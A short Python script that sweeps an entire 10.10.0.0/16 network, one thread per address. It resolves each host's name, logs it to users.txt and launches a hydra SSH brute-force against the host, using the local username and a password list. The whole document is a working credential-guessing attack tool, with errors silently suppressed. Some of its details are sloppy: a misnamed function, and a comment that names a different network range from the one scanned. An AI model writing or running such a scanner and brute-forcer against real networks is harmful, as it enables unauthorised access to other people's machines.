import socket
import getpass
import subprocess
import ipaddress
# import paramiko
import threading

def get_windows_username(ip_address):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        print(f"Found {hostname} ({ip_address})")
        with open('users.txt' , 'a') as f:
            f.write('username = ' + str(hostname) + 'ip = ' + str(ip_address) + '\n')
        username = getpass.getuser()
        
        hydra_command = f'hydra -l {username} -P pass.txt {ip_address} ssh'
        
        result = subprocess.run(hydra_command, shell=True, capture_output=True, text=True)
        
        print(f"Hydra result for {ip_address}:")
        print(result.stdout)
        
    except Exception as e:
        # Ignore errors for non-Windows or unreachable machines
        pass

def discover_ips_in_network(network):
    threads = []
    for ip in ipaddress.IPv4Network(network, strict=False):
        ip_address = str(ip)
        thread = threading.Thread(target=get_windows_username, args=(ip_address,))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

# Replace '192.168.1.0/24' with the actual network range (e.g., '192.168.0.0/16' for a full network)
discover_ips_in_network('10.10.0.0/16')